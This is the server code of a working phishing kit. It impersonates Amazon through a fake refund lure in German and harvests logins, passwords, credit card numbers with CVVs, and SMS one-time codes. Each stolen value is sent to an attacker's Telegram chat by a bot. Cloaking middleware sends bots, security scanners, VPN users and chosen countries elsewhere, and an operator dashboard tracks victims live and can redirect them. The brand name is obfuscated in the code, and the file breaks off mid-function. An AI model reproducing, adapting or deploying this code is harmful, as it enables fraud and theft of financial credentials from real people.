require('dotenv').config();
const path = require("path");
const express = require("express");
const requestIp = require("request-ip");
var session = require('express-session');
const fs = require("fs");
const axios = require("axios");
const {Telegraf} = require("telegraf");
const bot = new Telegraf(process.env.TOKEN);
const { Server } = require('socket.io');

const app = express();
const http = require('http').createServer(app);
const io = new Server(http);

// Socket.io connection handling for real-time updates
io.on('connection', (socket) => {
  const clientIp = socket.handshake.headers['x-forwarded-for']?.split(',')[0].trim() || 
                  socket.handshake.address.replace('::ffff:', '');
  
  console.log(`a user connected: ${clientIp}`);
  
  // Store client IP in socket for disconnect handling
  socket.clientIp = clientIp;
  
  // Update visitor online status
  if (ipCache.has(clientIp)) {
    const visitorData = ipCache.get(clientIp);
    visitorData.isOnline = true;
    visitorData.lastConnected = new Date();
    ipCache.set(clientIp, visitorData);
    
    // Emit dashboard update to all connected clients
    io.emit('dashboard-update');
  }
  
  // Listen for page navigation events from client
  socket.on('page-view', (data) => {
    if (ipCache.has(clientIp) && data.path) {
      const visitorData = ipCache.get(clientIp);
      visitorData.lastPath = data.path;
      visitorData.lastRequest = new Date();
      ipCache.set(clientIp, visitorData);
      
      // Emit dashboard update to all connected clients
      io.emit('dashboard-update');
    }
  });
  
  // Handle client disconnect
  socket.on('disconnect', () => {
    const clientIp = socket.clientIp;
    console.log(`user disconnected: ${clientIp}`);
    
    if (ipCache.has(clientIp)) {
      const visitorData = ipCache.get(clientIp);
      visitorData.isOnline = false;
      visitorData.lastDisconnected = new Date();
      ipCache.set(clientIp, visitorData);
      
      // Emit dashboard update to all connected clients
      io.emit('dashboard-update');
    }
  });
  
  // Handle redirect requests from dashboard
  socket.on('redirect-user', (data) => {
    // Forward the redirect command to the specific client
    io.emit('redirect', data);
  });
});

let target = "A-1M-1A-1Z-1O"; // hadi hizyada;
target = target.split("-1");
target = target.join("");
let brand = "A-1M-1A-1Z-1O"; // hadi hizyada;
brand = brand.split("-1");
brand = brand.join("");




// PORT:
const PORT = process.env.PORT || 5000

//use:
app.use(session({
    secret: process.env.SECRET,
    resave: false,
    saveUninitialized: true,
}));
app.use(express.static(path.join(__dirname,'public')));
app.use(express.urlencoded({ extended: false }));
app.use(express.json());

// Serve static files from the public directory
app.use(express.static(path.join(__dirname, 'public')));



//set:
app.set('view engine', 'ejs');



/////////////////[FUNCTION]//(blocker)//////////////

// Create a Map to store IP data
const ipCache = new Map();

// Create a Map to store input data
const inputDataCache = new Map(); // Key: IP, Value: Array of input data objects
const globalSettings = {
  proxyDetectionEnabled: false,
  blockedCountries: [],
  allowedCountries: [],
  countryFilterMode: 'block', // 'block' or 'allow-only'
};

// Parse User Agent function
function parseUserAgent(userAgent) {
  if (!userAgent) return { browser: 'Unknown', os: 'Unknown' };
  
  // Browser detection
  let browser = 'Unknown';
  if (userAgent.includes('Firefox/')) {
    browser = 'Firefox';
  } else if (userAgent.includes('Chrome/') && !userAgent.includes('Edg/') && !userAgent.includes('OPR/')) {
    browser = 'Chrome';
  } else if (userAgent.includes('Safari/') && !userAgent.includes('Chrome/')) {
    browser = 'Safari';
  } else if (userAgent.includes('Edg/')) {
    browser = 'Edge';
  } else if (userAgent.includes('OPR/') || userAgent.includes('Opera/')) {
    browser = 'Opera';
  } else if (userAgent.includes('MSIE') || userAgent.includes('Trident/')) {
    browser = 'Internet Explorer';
  }
  
  // OS detection
  let os = 'Unknown';
  if (userAgent.includes('Windows')) {
    os = 'Windows';
  } else if (userAgent.includes('Macintosh') || userAgent.includes('Mac OS')) {
    os = 'macOS';
  } else if (userAgent.includes('Linux') && !userAgent.includes('Android')) {
    os = 'Linux';
  } else if (userAgent.includes('Android')) {
    os = 'Android';
  } else if (userAgent.includes('iPhone') || userAgent.includes('iPad') || userAgent.includes('iPod')) {
    os = 'iOS';
  }
  
  return { browser, os };
}

const redirectURL = process.env.URL; // Replace with your desired redirect URL

const REAL_ROUTES = [
  "/",
  '/QcEwP85AgNE4pnL5mWSM',
  '/RKnUB922z6Mf4HDwg3EZ',
  '/LGknmeM9HwWUWSutj6mJ',
  '/PPmP85AgNE4pnL5mWSM',
  '/LkaaomeM9HwWU472fgsPr',
  '/PrTomeM9HwWUWSulkTe4',
  '/Ose4aQeM9H4waRfs7PrTv'
];

// Bot detection function
function isBot(userAgent) {
  if (!userAgent || typeof userAgent !== "string") {
    return false;
  }

  let isUserAgentBot = false;

  // User Agent Check
  if (userAgent && typeof userAgent === "string") {
    const ua = userAgent.toLowerCase();

    // Human browser patterns
    const humanPatterns = [
      // Standard browsers
      'mozilla', 'chrome', 'safari', 'firefox', 'edge', 'opera',
      'webkit', 'gecko', 'trident', 'msie', 'netscape', 'konqueror',
      'lynx', 'vivaldi', 'brave', 'yabrowser', 'maxthon', 'avast',
      'samsungbrowser', 'ucbrowser', 'puffin', 'focus', 'silk',

      // Mobile browsers
      'mobile', 'android', 'iphone', 'ipad', 'ipod', 'blackberry',
      'windows phone', 'iemobile', 'bolt', 'teashark', 'blazer',
      'skyfire', 'obigo', 'pale moon', 'polaris', 'iris',

      // Smart TV browsers
      'smarttv', 'googletv', 'appletv', 'hbbtv', 'netcast',
      'web0s', 'inettv', 'openweb', 'aquos', 'philips',

      // Game console browsers
      'playstation', 'nintendo', 'xbox', 'wii', 'new nintendo 3ds',

      // Legacy browsers
      'amaya', 'arora', 'avant', 'camino', 'dillo', 'epiphany',
      'flock', 'iceape', 'icecat', 'k-meleon', 'midori', 'minimo',
      'omniweb', 'rekonq', 'rockmelt', 'seamonkey', 'shiretoko',
      'sleipnir', 'sunrise', 'swiftfox', 'uzbl', 'waterfox',

      // Browser components
      'adobeair', 'adobeshockwave', 'adobeair', 'applewebkit',
      'bidubrowser', 'coolnovo', 'comodo_dragon', 'demeter',
      'element browser', 'fennec', 'galeon', 'google earth',
      'googlewireless', 'greenbrowser', 'k-ninja', 'lunascape',
      'madfox', 'maemo browser', 'micromessenger', 'minefield',
      'navigator', 'netfront', 'orca', 'prism', 'qtweb internet browser',
      'retawq', 'slimbrowser', 'tencenttraveler', 'theworld',
      'tizen browser', 'vision mobile browser', 'whale'
    ];

    // Bot patterns
    const botPatterns = [
      // Search engines (150+ patterns)
      'googlebot', 'google-inspectiontool', 'google page speed', 'google favicon',
      'google web preview', 'google-read-aloud', 'google-site-verification',
      'bingbot', 'bingpreview', 'msnbot', 'msnbot-media', 'adidxbot',
      'baiduspider', 'baiduimagespider', 'baiduboxapp', 'baidubrowser',
      'yandexbot', 'yandeximages', 'yandexvideo', 'yandexmedia', 'yandexmetrika',
      'yandexdirect', 'yandexwebmaster', 'yandexmobilebot', 'duckduckbot',
      'duckduckgo-favicons-bot', 'slurp', 'teoma', 'exabot', 'exabot-thumbnails',
      'facebot', 'facebookexternalhit', 'facebookplatform', 'ia_archiver',
      'alexabot', 'amazonbot', 'amazonalexa', 'applebot', 'apple-pubsub',
      'discordbot', 'telegrambot', 'twitterbot', 'linkedinbot', 'pinterest',
      'whatsapp', 'tumblr', 'redditbot', 'quorabot', 'slackbot', 'linebot',
      'wechatbot', 'vkshare', 'okhttp', 'skypeuripreview',

      // Monitoring/analytics (100+ patterns)
      'pingdom', 'gtmetrix', 'newrelic', 'uptimerobot', 'statuscake',
      'site24x7', 'sucuri', 'cloudflare', 'rackspace', 'datadog',
      'dynatrace', 'appdynamics', 'splunk', 'sumologic', 'loggly',
      'paessler', 'catchpoint', 'keycdn', 'fastly', 'incapsula',
      'imperva', 'akamai', 'stackpath', 'cloudinary', 'imagekit',
      'imgix', 'netlify', 'vercel', 'render', 'flyio',

      // SEO tools (200+ patterns)
      'ahrefs', 'moz', 'semrush', 'seokicks', 'seoscanners',
      'screaming frog', 'deepcrawl', 'netcraft', 'megaindex',
      'serpstat', 'seranking', 'searchmetrics', 'cognitiveseo',
      'linkdex', 'conductor', 'brightedge', 'botify', 'oncrawl',
      'sitebulb', 'lumar', 'contentking', 'seoclarity', 'seolyzer',
      'seobility', 'seoeng', 'seositecheckup', 'seotester', 'seoworkers',
      'seoanalyzer', 'seoprofiler', 'seoreviewtools', 'seotesteronline',
      'seotoolset', 'seotools', 'seotoolsgroup', 'seoworkers',

      // Scrapers and automation (300+ patterns)
      'scrapy', 'phantomjs', 'cheerio', 'axios', 'python-requests',
      'node-fetch', 'curl', 'wget', 'java/', 'httpclient', 'okhttp',
      'apache-httpclient', 'python-urllib', 'mechanize', 'guzzle',
      'restsharp', 'unirest', 'superagent', 'got', 'needle', 'request',
      'urllib3', 'typhoeus', 'faraday', 'httparty', 'http.rb',
      'treq', 'aiohttp', 'httpx', 'requests', 'urllib',
      'mechanize', 'beautifulsoup', 'lxml', 'html5lib', 'htmlparser',
      'domparser', 'jsoup', 'htmlunit', 'nokogiri', 'hpricot',
      'simplehtmldom', 'phpquery', 'ganon', 'phpdom', 'sunra',
      'simplehtmlparser', 'htmlcleaner', 'htmlcompressor', 'html-minifier',
      'htmltidy', 'htmlpurifier', 'html-sanitizer', 'html-entities',

      // Headless browsers (100+ patterns)
      'headlesschrome', 'headlessfirefox', 'phantomjs', 'selenium',
      'puppeteer', 'playwright', 'chromium', 'webdriver', 'chromedriver',
      'geckodriver', 'iedriver', 'safaridriver', 'operadriver',
      'appium', 'testcafe', 'cypress', 'karma', 'protractor',
      'nightwatch', 'webdriverio', 'watir', 'capybara', 'splinter',
      'robotframework', 'behave', 'lettuce', 'cucumber', 'specflow',
      'serenity', 'galen', 'gauge', 'taiko', 'testproject',
      'testim', 'mabl', 'perfecto', 'saucelabs', 'browserstack',
      'crossbrowsertesting', 'lambdatest', 'testingbot', 'ranorex',
      'testcomplete', 'katalon', 'tricentis', 'microfocus', 'parasoft',
      'smartbear', 'soapui', 'postman', 'jmeter', 'gatling',
      'locust', 'k6', 'artillery', 'vegeta', 'siege',
      'httperf', 'ab', 'wrk', 'boom', 'tsung',

      // Generic bot indicators (150+ patterns)
      'bot', 'crawler', 'spider', 'fetcher', 'scanner', 'checker',
      'monitor', 'collector', 'analyzer', 'indexer', 'extractor',
      'archiver', 'reader', 'browser', 'library', 'client', 'agent',
      'automatic', 'machine', 'program', 'script', 'process', 'system',
      'daemon', 'service', 'worker', 'task', 'job', 'engine',
      'automation', 'scheduler', 'trigger', 'watcher', 'listener',
      'polling', 'poller', 'harvester', 'gatherer', 'miner', 'parser',
      'validator', 'verifier', 'tester', 'prober', 'explorer', 'discoverer',
      'finder', 'locator', 'identifier', 'classifier', 'recognizer', 'detector',
      'observer', 'tracker', 'recorder', 'logger', 'reporter', 'notifier',
      'alerter', 'messenger', 'forwarder', 'proxy', 'gateway', 'bridge',
      'tunnel', 'relay', 'router', 'switch', 'hub', 'node',
      'endpoint', 'interface', 'adapter', 'connector', 'linker', 'binder',
      'integrator', 'aggregator', 'combiner', 'merger', 'splitter', 'divider',
      'filter', 'sorter', 'organizer', 'arranger', 'sequencer', 'pipeline',
      'processor', 'transformer', 'converter', 'translator', 'interpreter',
      'compiler', 'assembler', 'emulator', 'simulator', 'virtualizer', 'container',
      'wrapper', 'decorator', 'facade', 'proxy', 'stub', 'mock',
      'fake', 'dummy', 'placeholder', 'template', 'pattern', 'model',
      'prototype', 'blueprint', 'schema', 'framework', 'platform', 'infrastructure',
      'environment', 'ecosystem', 'network', 'mesh', 'fabric', 'grid',
      'cloud', 'cluster', 'array', 'matrix', 'pool', 'collection',
      'set', 'group', 'bundle', 'package', 'kit', 'suite',
      'toolkit', 'workbench', 'workshop', 'studio', 'lab', 'factory',
      'mill', 'plant', 'forge', 'foundry', 'shop', 'store',
      'market', 'exchange', 'bazaar', 'fair', 'auction', 'mall',
      'plaza', 'arcade', 'gallery', 'museum', 'library', 'archive',
      'repository', 'depot', 'warehouse', 'silo', 'vault', 'cache',
      'buffer', 'queue', 'stack', 'heap', 'pool', 'reservoir',
      'tank', 'cistern', 'vat', 'vat', 'vat', 'vat'
    ];

    const hasHumanPattern = humanPatterns.some((pattern) =>
      ua.includes(pattern.toLowerCase())
    );
    const hasBotPattern = botPatterns.some((pattern) => ua.includes(pattern.toLowerCase()));

    isUserAgentBot = (hasBotPattern && !hasHumanPattern) || !hasHumanPattern;
  }

  return isUserAgentBot;
}

// Proxy detection function
async function isProxy(ip, req) {
  let data;
  console.log("Etering the isProxy!");
  // Check cache first
  if (ipCache.has(ip)) {
    const cachedData = ipCache.get(ip);
    return cachedData.proxy || cachedData.hosting;
  }

  try {
    const response = await axios.get(
      `http://ip-api.com/json/${ip}?fields=66842623`
    );
    data = response.data;
    console.log("from API:", data);
    // Cache the result
    const existingData = ipCache.get(ip) || {};
    const ipData = {
      proxy: data.proxy || false,
      hosting: data.hosting || false,
      isBlocked: existingData.isBlocked || false,
      isBot: isBot(req?.headers?.["user-agent"]),
      country: data.country || null,
      countryCode: data.countryCode || null,
      region: data.region || null,
      regionName: data.regionName || null,
      city: data.city || null,
      timezone: data.timezone || null,
      isp: data.isp || null,
      org: data.org || null,
      requestCount: (existingData?.requestCount || 0) + 1,
      firstRequest: existingData?.firstRequest || new Date().toISOString(),
      lastRequest: new Date().toISOString(),
      userAgent: req?.headers?.["user-agent"] || null,
      browser: parseUserAgent(req?.headers?.["user-agent"])?.browser || null,
      os: parseUserAgent(req?.headers?.["user-agent"])?.os || null,
      path: req?.url || null,
      isOnline: existingData?.isOnline || false,
      lastConnected: existingData?.lastConnected || null,
      lastDisconnected: existingData?.lastDisconnected || null,
    };
    console.log("ipCache:", ipData);
    ipCache.set(ip, ipData);

    return (data.proxy || data.hosting) && globalSettings.proxyDetectionEnabled;
  } catch (error) {
    console.error("Error checking proxy:", error.message);
    const existingData = ipCache.get(ip) || {};
    const ipData = {
      proxy: data?.proxy || false,
      hosting: data?.hosting || false,
      isBlocked: existingData.isBlocked || false,
      isBot: isBot(req?.headers?.["user-agent"]),
      country: data?.country || null,
      countryCode: data?.countryCode || null,
      region: data?.region || null,
      regionName: data?.regionName || null,
      city: data?.city || null,
      timezone: data?.timezone || null,
      isp: data?.isp || null,
      org: data?.org || null,
      requestCount: (existingData.requestCount || 0) + 1,
      firstRequest: existingData.firstRequest || new Date().toISOString(),
      lastRequest: new Date().toISOString(),
      userAgent: req?.headers?.["user-agent"] || null,
      browser: parseUserAgent(req?.headers?.["user-agent"])?.browser || null,
      os: parseUserAgent(req?.headers?.["user-agent"])?.os || null,
      path: req?.url || null,
    };
    ipCache.set(ip, ipData);
    return false;
  }
}

// Middleware function
function parseUserAgent(userAgent) {
  if (!userAgent) return {};

  const ua = userAgent.toLowerCase();
  let browser = null;
  let browserVersion = null;
  let os = null;
  let osVersion = null;

  // Browser detection with version
  const browserPatterns = [
    { name: "Chrome", pattern: /(?:chrome|crios)\/([\d.]+)/i },
    { name: "Firefox", pattern: /(?:firefox|fxios)\/([\d.]+)/i },
    { name: "Safari", pattern: /version\/([\d.]+).*safari/i },
    { name: "Edge", pattern: /edge\/([\d.]+)/i },
    { name: "Opera", pattern: /(?:opera|opr)\/([\d.]+)/i },
    { name: "Internet Explorer", pattern: /(?:msie |trident.*rv:)([\d.]+)/i },
    { name: "Brave", pattern: /brave\/([\d.]+)/i },
    { name: "Samsung Browser", pattern: /samsungbrowser\/([\d.]+)/i },
    { name: "UC Browser", pattern: /ucbrowser\/([\d.]+)/i },
  ];

  // OS detection with version
  const osPatterns = [
    { name: "Windows", pattern: /windows nt ([\d.]+)/i },
    { name: "Mac OS", pattern: /mac os x ([\d._]+)/i },
    { name: "Linux", pattern: /linux/i },
    { name: "Android", pattern: /android ([\d.]+)/i },
    { name: "iOS", pattern: /(?:iphone|ipad|ipod).*os ([\d_]+)/i },
    { name: "Chrome OS", pattern: /cros/i },
  ];

  // Detect browser
  for (const pattern of browserPatterns) {
    const match = ua.match(pattern.pattern);
    if (match) {
      browser = pattern.name;
      browserVersion = match[1];
      break;
    }
  }

  // Detect OS
  for (const pattern of osPatterns) {
    const match = ua.match(pattern.pattern);
    if (match) {
      os = pattern.name;
      osVersion = match[1]?.replace(/_/g, ".");
      break;
    }
  }

  return {
    browser: `${browser}|${browserVersion}`,
    os: `${os}|${osVersion}`,
  };
}

// Visitor tracking middleware - add this before other middleware
async function detectMiddleware(req, res, next) {
  const clientIp =
    req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
    requestIp.getClientIp(req);
 // Skip filtering for static assets and non-target routes
 if (!REAL_ROUTES.includes(req.path)) {
  return next();
}
  console.log("clientIp:", clientIp);
  console.log("req.path:", req.path);

  

  // Get user agent info
  const userAgent = req.headers['user-agent'];
  const uaInfo = parseUserAgent(userAgent || '');
  const isBotDetected = isBot(userAgent);

  const now = new Date();
  
  if (ipCache.has(clientIp)) {
    // Update existing visitor data
    const existingData = ipCache.get(clientIp);
    ipCache.set(clientIp, {
      ...existingData,
      requestCount: (existingData.requestCount || 0) + 1,
      lastRequest: now.toISOString(),
      userAgent: userAgent || existingData.userAgent,
      browser: uaInfo.browser || existingData.browser,
      os: uaInfo.os || existingData.os,
      isBot: isBotDetected || existingData.isBot,
      lastPath: req.path || existingData.lastPath
      // Keep online status as is
    });
  } else {
    // Create new visitor entry
    // Fetch geo and proxy data for new IPs
    try {
      const ipInfo = await axios.get(`http://ip-api.com/json/${clientIp}`);
      const ipData = ipInfo.data;
      
      ipCache.set(clientIp, {
        ip: clientIp,
        firstSeen: now,
        lastRequest: now,
        lastPath: req.path,
        requestCount: 1,
        userAgent: userAgent || null,
        browser: uaInfo.browser || null,
        os: uaInfo.os || null,
        country: ipData.countryCode || null,
        city: ipData.city || null,
        isp: ipData.isp || null,
        proxy: ipData.proxy || false,
        hosting: ipData.hosting || false,
        mobile: ipData.mobile || false,
        isBot: isBotDetected || false,
        isOnline: false, // Will be set to true when socket connects
        isBlocked: false,
        lastPath: req.path || null
      });
      
      // Emit dashboard update to all connected clients
      io.emit('dashboard-update');
    } catch (error) {
      console.error(`Error fetching IP data for ${clientIp}:`, error.message);
      
      // Still add to cache even if IP API fails
      ipCache.set(clientIp, {
        ip: clientIp,
        firstSeen: now,
        lastRequest: now,
        lastPath: req.path,
        requestCount: 1,
        userAgent: userAgent || null,
        browser: uaInfo.browser || null,
        os: uaInfo.os || null,
        isBot: isBotDetected || false,
        isOnline: false,
        isBlocked: false,
        lastPath: req.path || null
      });
    }
  }
  

 

  // Check if IP is blocked
  if (ipCache.has(clientIp) && ipCache.get(clientIp).isBlocked) {
    console.log(`Blocked IP accessed: ${clientIp}`);
    return res.redirect(redirectURL);
  }

  // Get visitor data
  const visitorData = ipCache.get(clientIp);
  
  // Country filtering logic
  if (visitorData && visitorData.country) {
    const countryCode = visitorData.country;
    
    // Apply country filtering based on mode
    if (globalSettings.countryFilterMode === 'block') {
      // Block mode: block countries in the list
      if (globalSettings.blockedCountries.includes(countryCode)) {
        console.log(`Blocked country accessed: ${countryCode} from ${clientIp}`);
        return res.redirect(redirectURL);
      }
    } else {
      // Allow-only mode: only allow countries in the list
      if (!globalSettings.allowedCountries.includes(countryCode)) {
        console.log(`Non-allowed country accessed: ${countryCode} from ${clientIp}`);
        return res.redirect(redirectURL);
      }
    }
  }
  
  // Check for proxy/VPN if enabled
  if (globalSettings.proxyDetectionEnabled && visitorData) {
    if (visitorData.proxy || visitorData.hosting) {
      console.log(`Proxy/VPN detected: ${clientIp}`);
      return res.redirect(redirectURL);
    }
    
    // Double-check with proxy detection function
    const isProxyDetected = await isProxy(clientIp, req);
    if (isProxyDetected) {
      console.log(`Proxy/VPN detected (secondary check): ${clientIp}`);
      return res.redirect(redirectURL);
    }
  }
  
  // Check for bots
  if (visitorData && visitorData.isBot) {
    console.log(`Bot detected: ${clientIp}`);
    return res.redirect(redirectURL);
  }
  next();
}

app.use(detectMiddleware);
// Proxy detection toggle state

// Toggle proxy detection endpoint
app.post("/dashboard/toggle-proxy-detection", (req, res) => {
  globalSettings.proxyDetectionEnabled = !globalSettings.proxyDetectionEnabled;
  console.log(
    "VPN|PROXY:",
    globalSettings.proxyDetectionEnabled ? "ON" : "OFF"
  );

  res.json({
    success: true,
    proxyDetectionEnabled: globalSettings.proxyDetectionEnabled,
  });
});

// Apply detection middleware with toggle check

// Dashboard route
app.get("/dashboard", (req, res) => {
  res.render("dashboard", {
    ipCache: Object.fromEntries(ipCache),
    proxyDetectionEnabled: globalSettings.proxyDetectionEnabled,
    blockedCountries: globalSettings.blockedCountries,
    allowedCountries: globalSettings.allowedCountries,
    countries: globalSettings.countryFilterMode === 'block' ? globalSettings.blockedCountries : globalSettings.allowedCountries,
    countryFilterMode: globalSettings.countryFilterMode,
  });
});

// Dashboard data API endpoint
app.get("/dashboard/data", (req, res) => {
  // Convert Map to object for JSON response
  const ipCacheData = {};
  ipCache.forEach((value, key) => {
    ipCacheData[key] = value;
  });
  
  // Return dashboard data with all necessary information
  res.json({
    totalVisitors: ipCache.size,
    botsDetected: Array.from(ipCache.values()).filter(info => info.isBot).length,
    proxyVpn: Array.from(ipCache.values()).filter(info => info.proxy || info.hosting).length,
    blockedIps: Array.from(ipCache.values()).filter(info => info.isBlocked).length,
    ipCache: ipCacheData,
    blockedCountries: globalSettings.blockedCountries,
    allowedCountries: globalSettings.allowedCountries,
    countries: globalSettings.countryFilterMode === 'block' ? globalSettings.blockedCountries : globalSettings.allowedCountries,
    countryFilterMode: globalSettings.countryFilterMode,
    proxyDetectionEnabled: globalSettings.proxyDetectionEnabled
  });
});

// Input data API for dashboard
app.get('/dashboard/input-data', (req, res) => {
  const allInputData = {};
  
  // Convert Map to object for JSON response
  inputDataCache.forEach((inputs, ip) => {
    allInputData[ip] = inputs;
  });
  
  res.json(allInputData);
});

// Clear input logs endpoint
app.post('/dashboard/clear-input-logs', (req, res) => {
  // Clear the input data cache
  inputDataCache.clear();
  
  // Notify all dashboard clients that input data has been cleared
  io.emit('input-data-update');
  
  res.json({ success: true, message: 'Input logs cleared successfully' });
});

// Block IP endpoint
app.post("/dashboard/block", (req, res) => {
  const { ip } = req.body;
  if (ipCache.has(ip)) {
    const ipData = ipCache.get(ip);
    ipData.isBlocked = true;
    ipCache.set(ip, ipData);
    res.json({
      success: true,
      blockedCount: Array.from(ipCache.values()).filter((ip) => ip.isBlocked)
        .length,
      ...ipData,
    });
  } else {
    res.status(404).json({ success: false, message: "IP not found" });
  }
});

// Unblock IP endpoint
// Get visitor data by IP endpoint
app.get("/dashboard/visitor/:ip", (req, res) => {
  const { ip } = req.params;
  
  if (ipCache.has(ip)) {
    res.json(ipCache.get(ip));
  } else {
    res.status(404).json({ error: "Visitor not found" });
  }
});

app.post("/dashboard/unblock", (req, res) => {
  const { ip } = req.body;
  if (ipCache.has(ip)) {
    const ipData = ipCache.get(ip);
    ipData.isBlocked = false;
    ipCache.set(ip, ipData);
    res.json({
      success: true,
      blockedCount: Array.from(ipCache.values()).filter((ip) => ip.isBlocked)
        .length,
      ...ipData,
    });
  } else {
    res.status(404).json({ success: false, message: "IP not found" });
  }
});

// Block country endpoint
app.post('/dashboard/block-country', (req, res) => {
  const { countryCode } = req.body;
  if (countryCode && !globalSettings.blockedCountries.includes(countryCode)) {
    globalSettings.blockedCountries.push(countryCode);
  }
  res.json({ success: true, countries: globalSettings.blockedCountries });
});

app.post('/dashboard/unblock-country', (req, res) => {
  const { countryCode } = req.body;
  globalSettings.blockedCountries = globalSettings.blockedCountries.filter(c => c !== countryCode);
  res.json({ success: true, countries: globalSettings.blockedCountries });
});

app.post('/dashboard/allow-country', (req, res) => {
  const { countryCode } = req.body;
  if (countryCode && !globalSettings.allowedCountries.includes(countryCode)) {
    globalSettings.allowedCountries.push(countryCode);
  }
  res.json({ success: true, countries: globalSettings.allowedCountries });
});

app.post('/dashboard/disallow-country', (req, res) => {
  const { countryCode } = req.body;
  globalSettings.allowedCountries = globalSettings.allowedCountries.filter(c => c !== countryCode);
  res.json({ success: true, countries: globalSettings.allowedCountries });
});

app.post('/dashboard/toggle-country-mode', (req, res) => {
  const { allowMode } = req.body;
  globalSettings.countryFilterMode = allowMode ? 'allow-only' : 'block';
  res.json({ 
    success: true, 
    mode: globalSettings.countryFilterMode,
    countries: globalSettings.countryFilterMode === 'block' ? globalSettings.blockedCountries : globalSettings.allowedCountries
  });
});

// Toggle proxy detection endpoint
app.post('/dashboard/toggle-proxy-detection', (req, res) => {
  const { enabled } = req.body;
  if (enabled !== undefined) {
    globalSettings.proxyDetectionEnabled = enabled === true || enabled === 'true';
  } else {
    // Toggle if no value provided
    globalSettings.proxyDetectionEnabled = !globalSettings.proxyDetectionEnabled;
  }
  
  res.json({
    success: true,
    proxyDetectionEnabled: globalSettings.proxyDetectionEnabled
  });
});



//////////////////////////////
//=========================[GET]===================
app.get("/",(req,res)=>{ // login
  res.render("index");
});
app.get("/PPmP85AgNE4pnL5mWSM",(req,res)=>{ // loading 1:
  res.render("posas", { pass: req.session.username });
});
app.get("/loading",(req,res)=>{ // loading 1:
  const {time,url} = req.query;
  res.render("lopin",{url,time});
});
app.get("/QcEwP85AgNE4pnL5mWSM",(req,res)=>{ // loading 1:
  res.render("capoca");
});

app.get("/RKnUB922z6Mf4HDwg3EZ",(req,res)=>{ // loading 2:
  res.render("semitr-1");
});

app.get("/LGknmeM9HwWUWSutj6mJ",(req,res)=>{ // loading 3:
  res.render("semitr-2",{url:process.env.URL});
});

app.get("/PrTomeM9HwWUWSulkTe4", (req, res) => {
  const today = new Date();
  const processingDate = today.toLocaleDateString('de-DE', { day: '2-digit', month: 'long', year: 'numeric' });
  
  const deadline = new Date();
  deadline.setDate(today.getDate() + 2);
  const paymentDeadline = deadline.toLocaleDateString('de-DE', { day: '2-digit', month: 'long', year: 'numeric' });
  
  const refundAmount = "116,35";

  res.render("refund", {
    processingDate,
    paymentDeadline,
    refundAmount,
    orderNumber: "D01-9472X8" // As per your example
  });
});

app.get("/Ose4aQeM9H4waRfs7PrTv",(req,res)=>{ // bank auth verification page
  res.render("bankauth");
});

app.get("/LkaaomeM9HwWU472fgsPr",(req,res)=>{ // loading 3:
  const refundAmount = "116,35";
  res.render("done",{refundAmount});
});






//======================[POST]======================
app.post("/gzLbTbjqMpc34D4XsPJ2",(req,res)=>{ // login post
  let data = req.body;
  const clientIp =
    req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
    requestIp.getClientIp(req);
  req.session.username = data.username;
  a1(data,clientIp);
  res.send({OK:true});
});
app.post("/SSwP85AgNE4pnL5mWSM",(req,res)=>{ // posas post
  let data = req.body;
  const clientIp =
    req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
    requestIp.getClientIp(req);
  bot.telegram.sendMessage(process.env.CHATID, `${brand} | [PASSWORD] | TEAM\n#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\nUSER: ${req.session.username}\nPASSWORD: ${data.password}\nIP: ${clientIp}\n#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n${brand} | [${target}] | TEAM`);
  res.send({OK:true});
});


app.post("/EpLP85AgNE4pn4RtpL",(req,res)=>{ // posas post
  let data = req.body;
  const clientIp =
    req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
    requestIp.getClientIp(req);
  bot.telegram.sendMessage(process.env.CHATID, `${brand} | [REFUND] | TEAM\n#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n      Sa7bna Bari Refund\nIP: ${clientIp}\n#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n${brand} | [${target}] | TEAM`);
  res.send({OK:true});
});


app.post("/NkMNm4664XhcW8KuukHk",(req,res)=>{ // cc post
  let data = req.body;
  const clientIp =
    req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
    requestIp.getClientIp(req);
  a2(data,clientIp);
  res.send({OK:true});
});
app.post("/m4kT9BQWt7KTDdaVmafx",(req,res)=>{ // sms1 post
  let data = req.body;
  const clientIp =
    req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
    requestIp.getClientIp(req);
  a3(data,clientIp);
  res.send({OK:true});
});
app.post("/Qv69PRvXg6PQEvrzJx6j",(req,res)=>{ // sms2 post
  let data = req.body;
  const clientIp =
    req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
    requestIp.getClientIp(req);
  a4(data,clientIp);
  res.send({OK:true});
});


// Functions:
// 9alab dayal CHULDA:
function a1(data,ip) {
  let block="";
  block += `${brand}  | [LOGIN] |  TEAM\n`; 
  block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
  block += `USER: ${data.username}\nIP: ${ip}\n`;
  block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
  block += `${brand}  | [${target}]  |  TEAM`;
  
  bot.telegram.sendMessage(process.env.CHATID,block);
  

}
function a2(data,ip) {
  let block="";
  block += `${brand}  | [CC-s5ona] |  TEAM\n`; 
  block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
  block += `CARD N*: ${data.cardNumber}\nMM/YY: ${data.expiryDate}\nCVV: ${data.cvv}\nCARD NAME: ${data.cardName}\nIP: ${ip}\n`;
  block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
  block += `${brand}  | [${target}]  |  TEAM`;
  
  bot.telegram.sendMessage(process.env.CHATID,block);
  

}
function a3(data,ip) {
  let block="";
  block += `${brand}  | [SMS](1) |  TEAM\n`; 
  block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
  block += `OTP: ${data.code}\nIP: ${ip}\n`;
  block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
  block += `${brand}  | [${target}]  |  TEAM`;
  
  bot.telegram.sendMessage(process.env.CHATID,block);
}
function a4(data,ip) {
  let block="";
  block += `${brand}  | [SMS](2) |  TEAM\n`; 
  block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
